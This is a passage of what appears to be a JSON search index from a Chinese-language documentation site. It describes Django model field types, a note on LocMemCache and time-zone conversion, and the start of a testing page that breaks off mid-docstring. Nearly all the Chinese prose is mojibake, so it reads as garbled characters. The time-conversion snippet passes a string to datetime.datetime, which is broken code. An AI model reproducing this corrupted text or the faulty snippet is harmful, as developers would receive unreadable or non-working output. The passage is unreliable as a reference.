å¿…é¡»çš„ã€‚ä¸€ä¸ªç›®å½•çš„ç»å¯¹æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œè¿™ä¸ª FilePathField åº”ä»è¯¥ç›®å½•ä¸­è·å–å…¶é€‰æ‹©ã€‚ä¾‹å¦‚ï¼š\"/home/images\"ã€‚ path ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå¯ä»¥æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€è®¾ç½®è·¯å¾„çš„å‡½æ•°ã€‚ä¾‹å¦‚: import os from django.conf import settings from django.db import models def images_path(): return os.path.join(settings.LOCAL_FILE_DIR, 'images') class MyModel(models.Model): file = models.FilePathField(path=images_path) FilePathField.matc å¯é€‰ã€‚ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ FilePathField å°†ç”¨äºè¿‡æ»¤æ–‡ä»¶åã€‚ è¯·æ³¨æ„ï¼Œæ­£åˆ™è¡¨è¾¾å¼å°†è¢«åº”ç”¨äºåŸºæœ¬æ–‡ä»¶åï¼Œè€Œä¸æ˜¯å®Œæ•´çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼š\"foo.*.txt$\"ï¼Œå®ƒå°†åŒ¹é…åä¸º foo23.txt çš„æ–‡ä»¶ï¼Œä½†ä¸åŒ¹é… bar.txt æˆ– foo23.pngã€‚ FilePathField.recursive å¯é€‰ã€‚True æˆ– Falseã€‚é»˜è®¤ä¸º Falseã€‚æŒ‡å®šæ˜¯å¦åŒ…å« path çš„æ‰€æœ‰å­ç›®å½•ã€‚ FilePathField.allow_files å¯é€‰ã€‚ True æˆ– Falseã€‚ é»˜è®¤å€¼æ˜¯ Trueã€‚ æŒ‡å®šæ˜¯å¦åº”è¯¥åŒ…å«æŒ‡å®šä½ç½®çš„æ–‡ä»¶ã€‚ è¿™ä¸ªæˆ– allow_folders å¿…é¡»æ˜¯ Trueã€‚ FilePathField.allow_folders å¯é€‰ã€‚ True æˆ– Falseã€‚ é»˜è®¤ä¸º Falseã€‚ æŒ‡å®šæ˜¯å¦åº”è¯¥åŒ…å«æŒ‡å®šä½ç½®çš„æ–‡ä»¶å¤¹ã€‚ è¿™ä¸ªæˆ– allow_files å¿…é¡»æ˜¯ Trueã€‚ ä¸€ä¸ªæ½œåœ¨çš„é—®é¢˜æ˜¯ match é€‚ç”¨äºåŸºæœ¬æ–‡ä»¶åï¼Œè€Œä¸æ˜¯å®Œæ•´çš„è·¯å¾„ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªä¾‹å­: FilePathField(path=\"/home/images\", match=\"foo.*\", recursive=True) å°†åŒ¹é… /home/images/foo.pngï¼Œä½†ä¸åŒ¹é… /home/images/foo/bar.pngï¼Œå› ä¸º match é€‚ç”¨äºåŸºæœ¬æ–‡ä»¶åï¼ˆ foo.png å’Œ bar.png ï¼‰ã€‚ FilePathField å®ä¾‹åœ¨æ•°æ®åº“ä¸­ä½œä¸º varchar åˆ—åˆ›å»ºï¼Œé»˜è®¤æœ€å¤§é•¿åº¦ä¸º 100 ä¸ªå­—ç¬¦ã€‚ ä¸å…¶ä»–å­—æ®µä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨ max_length å‚æ•°æ”¹å˜æœ€å¤§é•¿åº¦ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filepathfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filepathfield.html"},{"title":"FloatField","text":"åœ¨ Python ä¸­ç”¨ä¸€ä¸ª float å®ä¾‹è¡¨ç¤ºçš„æµ®ç‚¹æ•°: class FloatField(**options) å½“ localize ä¸º False æ—¶æ˜¯ NumberInput å¦åˆ™ï¼Œè¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ TextInputã€‚ FloatField vs. DecimalField FloatField ç±»æœ‰æ—¶ä¼šä¸ DecimalField ç±»æ··æ·†ã€‚ è™½ç„¶å®ƒä»¬éƒ½è¡¨ç¤ºå®æ•°ï¼Œä½†å®ƒä»¬è¡¨ç¤ºçš„æ–¹å¼ä¸åŒã€‚ FloatField å†…éƒ¨ä½¿ç”¨ Python çš„ float ç±»å‹ï¼Œ è€Œ DecimalField åˆ™ä½¿ç”¨ Python çš„ Decimal ç±»å‹ã€‚å…³äºä¸¤è€…ä¹‹é—´çš„åŒºåˆ«ï¼Œè¯·å‚è§ Python çš„ decimal æ¨¡å—çš„æ–‡æ¡£ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Floatfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Floatfield.html"},{"title":"GenericIPAddressField","text":"IPv4 æˆ– IPv6 åœ°å€ï¼Œå­—ç¬¦ä¸²æ ¼å¼ï¼ˆå¦‚ 192.0.2.30 æˆ– 2a02:42fe::4 ï¼‰ã€‚è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª TextInput: class GenericIPAddressField(protocol='both', unpack_ipv4=False, **options) IPv6 åœ°å€è§„èŒƒåŒ–éµå¾ª RFC 4291#section-2.2 ç¬¬ 2.2 èŠ‚ï¼Œ åŒ…æ‹¬ä½¿ç”¨è¯¥èŠ‚ç¬¬ 3 æ®µå»ºè®®çš„ IPv4 æ ¼å¼ï¼Œå¦‚ ::fffff:192.0.2.0ã€‚ ä¾‹å¦‚ï¼Œ2001:0::0:01 å°†è¢«æ ‡å‡†åŒ–ä¸º 2001::1ï¼Œ::fffff:0a0a:0a0a å°†è¢«æ ‡å‡†åŒ–ä¸º ::fffff:10.10.10.10ã€‚æ‰€æœ‰å­—ç¬¦éƒ½è½¬æ¢ä¸ºå°å†™ã€‚ GenericIPAddressField.protocol å°†æœ‰æ•ˆè¾“å…¥é™åˆ¶ä¸ºæŒ‡å®šåè®®ã€‚æ¥å—çš„å€¼æ˜¯ 'both' ï¼ˆé»˜è®¤ï¼‰ã€'IPv4' æˆ– 'IPv6'ã€‚åŒ¹é…æ˜¯ä¸åˆ†å¤§å°å†™çš„ã€‚ GenericIPAddressField.unpack_ipv4 è§£å‹ IPv4 æ˜ å°„åœ°å€ï¼Œå¦‚ ::fffff:192.0.2.1ã€‚å¦‚æœå¯ç”¨è¯¥é€‰é¡¹ï¼Œè¯¥åœ°å€å°†è¢«è§£å‹ä¸º 192.0.2.1ã€‚é»˜è®¤ä¸ºç¦ç”¨ã€‚åªæœ‰å½“ protocol è®¾ç½®ä¸º 'both' æ—¶æ‰ä¼šå¯ç”¨ã€‚ å¦‚æœå…è®¸ç©ºå€¼ï¼Œå°±å¿…é¡»å…è®¸ null å€¼ï¼Œå› ä¸ºç©ºå€¼ä¼šè¢«å­˜å‚¨ä¸º nullã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-GeneicipaddressField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-GeneicipaddressField.html"},{"title":"ImageField","text":"ç»§æ‰¿ FileField çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œä½†ä¹ŸéªŒè¯ä¸Šä¼ çš„å¯¹è±¡æ˜¯æœ‰æ•ˆçš„å›¾åƒ: class ImageField(upload_to=None, height_field=None, width_field=None, max_length=100, \\*\\*options) é™¤äº† FileField çš„ç‰¹æ®Šå±æ€§å¤–ï¼Œ ImageField ä¹Ÿæœ‰ height å’Œ width å±æ€§ã€‚ ä¸ºäº†æ–¹ä¾¿æŸ¥è¯¢è¿™äº›å±æ€§ï¼ŒImageField æœ‰ä¸¤ä¸ªé¢å¤–çš„å¯é€‰å‚æ•°ã€‚ ImageField.height_field æ¨¡å‹å­—æ®µçš„åç§°ï¼Œæ¯æ¬¡ä¿å­˜æ¨¡å‹å®ä¾‹æ—¶å°†è‡ªåŠ¨å¡«å……å›¾åƒçš„é«˜åº¦ã€‚ ImageField.width_field æ¨¡å‹å­—æ®µçš„åç§°ï¼Œæ¯æ¬¡ä¿å­˜æ¨¡å‹å®ä¾‹æ—¶å°†è‡ªåŠ¨å¡«å……å›¾åƒçš„å®½åº¦ã€‚ éœ€è¦ Pillow åº“ã€‚ ImageField å®ä¾‹åœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸º varchar åˆ—ï¼Œé»˜è®¤æœ€å¤§é•¿åº¦ä¸º 100 ä¸ªå­—ç¬¦ã€‚ä¸å…¶ä»–å­—æ®µä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨ max_length å‚æ•°æ”¹å˜æœ€å¤§é•¿åº¦ã€‚ è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª ClearableFileInputã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-ImageField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-ImageField.html"},{"title":"IntegerField","text":"ä¸€ä¸ªæ•´æ•°ã€‚ä» -2147483648 åˆ° 2147483647 çš„å€¼åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“ä¸­éƒ½æ˜¯å®‰å…¨çš„: class IntegerField(\\*\\*options) å®ƒä½¿ç”¨ MinValueValidator å’Œ MaxValueValidator æ ¹æ®é»˜è®¤æ•°æ®åº“æ”¯æŒçš„å€¼æ¥éªŒè¯è¾“å…¥ã€‚ å½“ localize ä¸º False æ—¶æ˜¯ NumberInput å¦åˆ™ï¼Œè¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ TextInputã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Integerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Integerfield.html"},{"title":"JSONField","text":"New in Django 3.1. ä¸€ä¸ªç”¨äºå­˜å‚¨ JSON ç¼–ç æ•°æ®çš„å­—æ®µã€‚åœ¨ Python ä¸­ï¼Œæ•°æ®ä»¥å…¶ Python æœ¬åœ°æ ¼å¼è¡¨ç¤ºï¼šå­—å…¸ã€åˆ—è¡¨ã€å­—ç¬¦ä¸²ã€æ•°å­—ã€å¸ƒå°”å€¼å’Œ None: class JSONField(encoder=None, decoder=None, **options) JSONField åœ¨ MariaDB 10.2.7+ã€MySQL 5.7.8+ã€Oracleã€PostgreSQL å’Œ SQLiteï¼ˆåœ¨ JSON1 æ‰©å±•è¢«å¯ç”¨çš„æƒ…å†µä¸‹ï¼‰éƒ½æ”¯æŒã€‚ JSONField.encoder ä¸€ä¸ªå¯é€‰çš„ json.JSONEncoder å­ç±»ï¼Œç”¨äºåºåˆ—åŒ–æ ‡å‡† JSON åºåˆ—åŒ–å™¨ä¸æ”¯æŒçš„æ•°æ®ç±»å‹ï¼ˆä¾‹å¦‚ datetime.datetime æˆ– UUID ï¼‰ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ DjangoJSONEncoder ç±»ã€‚ é»˜è®¤ä¸º json.JSONEncoderã€‚ JSONField.decoder ä¸€ä¸ªå¯é€‰çš„ json.JSONDecoder å­ç±»ï¼Œç”¨äºååºåˆ—åŒ–ä»æ•°æ®åº“ä¸­è·å–çš„å€¼ã€‚ è¯¥å€¼å°†é‡‡ç”¨è‡ªå®šä¹‰ç¼–ç å™¨é€‰æ‹©çš„æ ¼å¼ï¼ˆé€šå¸¸æ˜¯å­—ç¬¦ä¸²ï¼‰ã€‚ ä½ çš„ååºåˆ—åŒ–å¯èƒ½éœ€è¦è€ƒè™‘åˆ°ä½ æ— æ³•ç¡®å®šè¾“å…¥ç±»å‹çš„äº‹å®ã€‚ ä¾‹å¦‚ï¼Œä½ æœ‰å¯èƒ½è¿”å›ä¸€ä¸ª datetimeï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œè¿™ä¸ªå­—ç¬¦ä¸²æ°å¥½ä¸ datetime é€‰æ‹©çš„æ ¼å¼ç›¸åŒã€‚ é»˜è®¤ä¸º json.JSONDecoderã€‚ å¦‚æœä½ ç»™å­—æ®µä¸€ä¸ª defaultï¼Œç¡®ä¿å®ƒæ˜¯ä¸€ä¸ªä¸å¯å˜çš„å¯¹è±¡ï¼Œ æ¯”å¦‚ strï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªæ¯æ¬¡è¿”å›ä¸€ä¸ªæ–°çš„å¯å˜å¯¹è±¡çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œ æ¯”å¦‚ dict æˆ–ä¸€ä¸ªå‡½æ•°ã€‚æä¾›ä¸€ä¸ªåƒ default={} æˆ– default=[] è¿™æ ·çš„å¯æ”¹å˜çš„é»˜è®¤å¯¹è±¡ï¼Œåœ¨æ‰€æœ‰æ¨¡å‹å®ä¾‹ä¹‹é—´å…±äº«ä¸€ä¸ªå¯¹è±¡ã€‚ è¦åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢ JSONFieldï¼Œè¯·çœ‹ æŸ¥è¯¢ JSONFieldã€‚ ç´¢å¼• Index å’Œ Field.db_index éƒ½åˆ›å»ºäº†ä¸€ä¸ª B æ ‘ç´¢å¼•ï¼Œåœ¨æŸ¥è¯¢ JSONField çš„æ—¶å€™å¹¶ä¸æ˜¯ç‰¹åˆ«æœ‰ç”¨ã€‚ä»…åœ¨ PostgreSQL ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ GinIndex æ¯”è¾ƒé€‚åˆã€‚ PostgreSQL ç”¨æˆ· PostgreSQL æœ‰ä¸¤ç§åŸºäº JSON çš„åŸç”Ÿæ•°æ®ç±»å‹ï¼š json å’Œ jsonbã€‚json å’Œ jsonbã€‚ å®ƒä»¬ä¹‹é—´çš„ä¸»è¦åŒºåˆ«åœ¨äºå®ƒä»¬çš„å­˜å‚¨æ–¹å¼å’ŒæŸ¥è¯¢æ–¹å¼ã€‚ PostgreSQL çš„ json å­—æ®µæ˜¯ä½œä¸º JSON çš„åŸå§‹å­—ç¬¦ä¸²è¡¨ç¤ºæ¥å­˜å‚¨çš„ï¼Œå½“æ ¹æ®é”®æ¥æŸ¥è¯¢æ—¶ï¼Œå¿…é¡»åŒæ—¶è¿›è¡Œè§£ç ã€‚ jsonb å­—æ®µæ˜¯åŸºäº JSON çš„å®é™…ç»“æ„å­˜å‚¨çš„ï¼Œå®ƒå…è®¸ç´¢å¼•ã€‚è¿™æ ·åšçš„ä»£ä»·æ˜¯åœ¨å†™å…¥ jsonb å­—æ®µæ—¶å¢åŠ äº†ä¸€ç‚¹æˆæœ¬ã€‚JSONField ä½¿ç”¨ jsonbã€‚ Oracle ç”¨æˆ· Oracle æ•°æ®åº“ä¸æ”¯æŒå­˜å‚¨ JSON æ ‡é‡å€¼ã€‚åªæ”¯æŒ JSON å¯¹è±¡å’Œæ•°ç»„ï¼ˆåœ¨ Python ä¸­ä½¿ç”¨ dict å’Œ list è¡¨ç¤º)ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Jsonfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Jsonfield.html"},{"title":"NullBooleanField","text":"å°±åƒ BooleanField çš„ null=True: class NullBooleanField(**options) 3.1 ç‰ˆåå·²ç§»é™¤: NullBooleanField å·²è¢«åºŸå¼ƒï¼Œæ”¹ä¸º BooleanField(null=True)ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-NullBooleanfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-NullBooleanfield.html"},{"title":"PositiveIntegerField","text":"å°±åƒ IntegerField ä¸€æ ·ï¼Œä½†å¿…é¡»æ˜¯æ­£å€¼æˆ–é›¶ï¼ˆ 0 ï¼‰ã€‚ ä» 0 åˆ° 2147483647 çš„å€¼åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“ä¸­éƒ½æ˜¯å®‰å…¨çš„ã€‚å‡ºäºå‘åå…¼å®¹çš„åŸå› ï¼Œæ¥å— 0 çš„å€¼: class PositiveIntegerField(**options)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositiveIntegerField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositiveIntegerField.html"},{"title":"PositiveBigIntegerField","text":"New in Django 3.1. å°±åƒä¸€ä¸ª PositiveIntegerFieldï¼Œä½†åªå…è®¸åœ¨æŸä¸€ç‰¹å®šç‚¹ä¸‹çš„å€¼ï¼ˆä¾èµ–äºæ•°æ®åº“ï¼‰ã€‚ 0 åˆ° 9223372036854775807 çš„å€¼åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“ä¸­éƒ½æ˜¯å®‰å…¨çš„: class PositiveBigIntegerField(**options)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Positivebigintegerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Positivebigintegerfield.html"},{"title":"PositiveSmallIntegerField","text":"å°±åƒä¸€ä¸ª PositiveIntegerFieldï¼Œä½†åªå…è®¸åœ¨æŸä¸€ç‰¹å®šï¼ˆæ•°æ®åº“ä¾èµ–çš„ï¼‰ç‚¹ä¸‹å–å€¼ã€‚0 åˆ° 32767 çš„å€¼åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“ä¸­éƒ½æ˜¯å®‰å…¨çš„: class PositiveSmallIntegerField(**options)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositivesmallintegerField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositivesmallintegerField.html"},{"title":"SlugField","text":"Slug æ˜¯ä¸€ä¸ªæŠ¥çº¸æœ¯è¯­ã€‚slug æ˜¯ä¸€ä¸ªç®€çŸ­çš„æ ‡ç­¾ï¼ŒåªåŒ…å«å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿æˆ–è¿å­—ç¬¦ã€‚å®ƒä»¬ä¸€èˆ¬ç”¨äº URL ä¸­: class SlugField(max_length=50, **options) åƒ CharField ä¸€æ ·ï¼Œä½ å¯ä»¥æŒ‡å®š max_length ï¼ˆä¹Ÿè¯·é˜…è¯»é‚£ä¸€èŠ‚ä¸­å…³äºæ•°æ®åº“å¯ç§»æ¤æ€§å’Œ max_length çš„è¯´æ˜ï¼‰ã€‚ å¦‚æœæ²¡æœ‰æŒ‡å®š max_lengthï¼ŒDjango å°†ä½¿ç”¨é»˜è®¤é•¿åº¦ 50ã€‚ æ„å‘³ç€å°† Field.db_index è®¾ç½®ä¸º Trueã€‚ åŸºäºå…¶ä»–å€¼çš„å€¼è‡ªåŠ¨é¢„å¡«å……ä¸€ä¸ª SlugField é€šå¸¸æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ ä½ å¯ä»¥åœ¨ç®¡ç†ä¸­ä½¿ç”¨ prepopulated_fields æ¥è‡ªåŠ¨å®Œæˆã€‚ å®ƒä½¿ç”¨ validate_slug æˆ– validate_unicode_slug è¿›è¡ŒéªŒè¯ã€‚ SlugField.allow_unicode å¦‚æœæ˜¯ Trueï¼Œè¯¥å­—æ®µé™¤äº†æ¥å— ASCII å­—æ¯å¤–ï¼Œè¿˜æ¥å— Unicode å­—æ¯ã€‚é»˜è®¤å€¼ä¸º Falseã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Slugfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Slugfield.html"},{"title":"SmallAutoField","text":"å°±åƒä¸€ä¸ª AutoFieldï¼Œä½†åªå…è®¸å€¼åœ¨ä¸€å®šï¼ˆä¾èµ–äºæ•°æ®åº“ï¼‰çš„é™åˆ¶ä¸‹ã€‚1 åˆ° 32767 çš„å€¼åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“ä¸­éƒ½æ˜¯å®‰å…¨çš„: class SmallAutoField(**options)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallautofield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallautofield.html"},{"title":"SmallIntegerField","text":"å°±åƒä¸€ä¸ª IntegerFieldï¼Œä½†åªå…è®¸åœ¨æŸä¸€ç‰¹å®šï¼ˆä¾èµ–äºæ•°æ®åº“çš„ï¼‰ç‚¹ä¸‹å–å€¼ã€‚ä» -32768 åˆ° 32767 çš„å€¼åœ¨ Django æ”¯æŒçš„æ‰€æœ‰æ•°æ®åº“ä¸­éƒ½æ˜¯å®‰å…¨çš„: class SmallIntegerField(**options)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallintegerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallintegerfield.html"},{"title":"TextField","text":"ä¸€ä¸ªå¤§çš„æ–‡æœ¬å­—æ®µã€‚è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª Textarea: class TextField(**options) å¦‚æœä½ æŒ‡å®šäº† max_length å±æ€§ï¼Œå®ƒå°†åæ˜ åœ¨è‡ªåŠ¨ç”Ÿæˆçš„è¡¨å•å­—æ®µçš„ Textarea éƒ¨ä»¶ä¸­ã€‚ ä½†æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰åœ¨æ¨¡å‹æˆ–æ•°æ®åº“å±‚é¢è¢«å¼ºåˆ¶æ‰§è¡Œã€‚ä½¿ç”¨ä¸€ä¸ª CharField æ¥å®ç°ã€‚ TextField.db_collation New in Django 3.2. è¯¥å­—æ®µçš„æ•°æ®åº“å­—ç¬¦åºåç§°ã€‚ æ³¨è§£ å­—ç¬¦åºåç§°æ˜¯ä¸æ ‡å‡†åŒ–çš„ã€‚å› æ­¤ï¼Œè¿™å°†æ— æ³•åœ¨å¤šä¸ªæ•°æ®åº“åç«¯ä¹‹é—´è¿›è¡Œç§»æ¤ã€‚ Oracle Oracle ä¸æ”¯æŒ TextField çš„å­—ç¬¦åºã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Textfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Textfield.html"},{"title":"TimeField","text":"ä¸€ä¸ªæ—¶é—´ï¼Œåœ¨ Python ä¸­ç”¨ datetime.time å®ä¾‹è¡¨ç¤ºã€‚æ¥å—ä¸ DateField ç›¸åŒçš„è‡ªåŠ¨å¡«å……é€‰é¡¹: class TimeField(auto_now=False, auto_now_add=False, **options) è¯¥å­—æ®µé»˜è®¤çš„è¡¨å•éƒ¨ä»¶tæ˜¯ä¸€ä¸ª TimeInputã€‚ç®¡ç†ä¸­æ·»åŠ äº†ä¸€äº› JavaScript å¿«æ·æ–¹å¼ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Timefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Timefield.html"},{"title":"URLField","text":"URL çš„ CharFieldï¼Œç”± URLValidator éªŒè¯: class URLField(max_length=200, **options) è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª URLInputã€‚ åƒæ‰€æœ‰çš„ CharField å­ç±»ä¸€æ ·ï¼Œ URLField æ¥å—å¯é€‰çš„ max_length å‚æ•°ã€‚å¦‚æœä½ æ²¡æœ‰æŒ‡å®š max_length å‚æ•°ï¼Œåˆ™ä½¿ç”¨é»˜è®¤çš„ 200ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Urlfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Urlfield.html"},{"title":"UUIDField","text":"ä¸€ä¸ªç”¨äºå­˜å‚¨é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦çš„å­—æ®µã€‚ä½¿ç”¨ Python çš„ UUID ç±»ã€‚å½“åœ¨ PostgreSQL ä¸Šä½¿ç”¨æ—¶ï¼Œå®ƒå­˜å‚¨åœ¨ä¸€ä¸ª uuid çš„æ•°æ®ç±»å‹ä¸­ï¼Œå¦åˆ™å­˜å‚¨åœ¨ä¸€ä¸ª char(32) ä¸­: class UUIDField(**options) é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦æ˜¯ primary_key çš„ AutoField çš„ä¸€ä¸ªå¾ˆå¥½çš„æ›¿ä»£æ–¹æ¡ˆã€‚æ•°æ®åº“ä¸ä¼šä¸ºä½ ç”Ÿæˆ UUIDï¼Œæ‰€ä»¥å»ºè®®ä½¿ç”¨ default import uuid from django.db import models class MyUUIDModel(models.Model): id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False) # other fields è¯·æ³¨æ„ï¼Œä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼ˆçœç•¥æ‹¬å·ï¼‰è¢«ä¼ é€’ç»™ defaultï¼Œè€Œä¸æ˜¯ UUID çš„å®ä¾‹ã€‚ åœ¨ PostgreSQL ä¸ŠæŸ¥æ‰¾ åœ¨ PostgreSQL ä¸Šä½¿ç”¨ iexactã€containsã€icontainsã€startswithã€istartswithã€endswith æˆ– iendswith åœ¨ PostgreSQL ä¸ŠæŸ¥æ‰¾æ²¡æœ‰è¿å­—ç¬¦çš„å€¼æ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸º PostgreSQL å°†å®ƒä»¬å­˜å‚¨åœ¨ä¸€ä¸ªè¿å­—ç¬¦çš„ uuid æ•°æ®ç±»å‹ä¸­ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Uuidfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Uuidfield.html"},{"title":"é—®é¢˜æ€»ç»“","text":"ç¼“å­˜æ¨¡å—çš„é—®é¢˜ ä½¿ç”¨çš„ LocMemCache æ˜¯ä¸èƒ½ä½œåŒæ­¥ç¼“å­˜çš„ æ³¨æ„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç§æœ‰ç¼“å­˜å®ä¾‹ï¼Œè¿™æ„å‘³ç€ä¸å¯èƒ½æœ‰è·¨è¿›ç¨‹ç¼“å­˜ æ‰€ä»¥è¯´, LocMemCacheæ˜¯ä¸èƒ½ç”¨æ¥åšåŒæ­¥ç¼“å­˜çš„! è¯·ä½¿ç”¨åˆ«çš„ä»»æ„Cache! å¯ä»¥å‚è€ƒä»¥ä¸‹é“¾æ¥ä½¿ç”¨å…¶ä»–çš„ç¼“å­˜ å‚è€ƒ:: éœ‡æƒŠï¼Djangoç¼“å­˜ä¸­çš„æ•°æ®é¢‘é¢‘ä¸¢å¤±ï¼Œç©¶ç«Ÿè°æ˜¯å¹•åé»‘æ‰‹ ä½¿ç”¨å…¶ä»–çš„ç¼“å­˜ Djangoé¡¹ç›®å¦‚ä½•é…ç½®Memcachedå’ŒRedisç¼“å­˜?å“ªä¸ªæ›´å¥½? Rediså’ŒMemcacheçš„åŒºåˆ«åˆ†æ æ—¶é—´æ ¼å¼è½¬æ¢ å¦‚: # django æ•°æ®åº“æŸ¥è¯¢ 2021-07-30T02:46:00.Z æ ¼å¼æ—¥æœŸè½¬æ¢ # æœ«æ—¥æ•°æ®åº“æ ¼å¼æŸ¥è¯¢ç»“æœ a = datetime.datetime('2021-07-30T02:46:00.Z') TIME_ZONE = 'Asia/Shanghai' TZ_SHANGHAI = pytz.timezone(TIME_ZONE) # è½¬æ¢ a.astimezone(TZ_SHANGHAI).strftime('%Y-%m-%d %H:%M:%S')","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-conclusion-of-issue.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-conclusion-of-issue.html"},{"title":"æµ‹è¯•","text":"ä¸€ä»½å¥½çš„ä¸šåŠ¡ä»£ç ï¼Œæ˜¯éœ€è¦ç»è¿‡å®é™…æµ‹è¯•çš„ã€‚ ä¸€æ–¹é¢æ˜¯è‡ªå·±ç¡®è®¤ä»£ç è¿è¡Œæ­£å¸¸ï¼Œå¦ä¸€æ–¹é¢æ˜¯å¯¹å¤–æä¾›æµ‹è¯•ä¿¡æ¯ã€‚ ç¼–å†™æ–¹æ³• ä¸€èˆ¬æ¥è¯´ï¼ŒDjangoçš„æµ‹è¯•ç”¨ä¾‹åº”è¯¥å®šä¹‰åœ¨åº”ç”¨çš„ tests.py æ–‡ä»¶é‡Œã€‚ ç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨ä»¥ tests å¼€å¤´çš„æ–‡ä»¶é‡Œå¯»æ‰¾å¹¶æ‰§è¡Œæµ‹è¯•ä»£ç ã€‚ æ¯”å¦‚æœ‰ä¸€ä¸ª polls çš„djangoåº”ç”¨ï¼Œå°†ä»¥ä¸‹ä»£ç å†™å…¥ tests.py: import datetime from django.test import TestCase from django.utils import timezone from .models import Question class QuestionModelTests(TestCase): def test_was_published_recently_with_future_question(self): \"\"\" was_published_recently() returns False for questions whose pub_date is 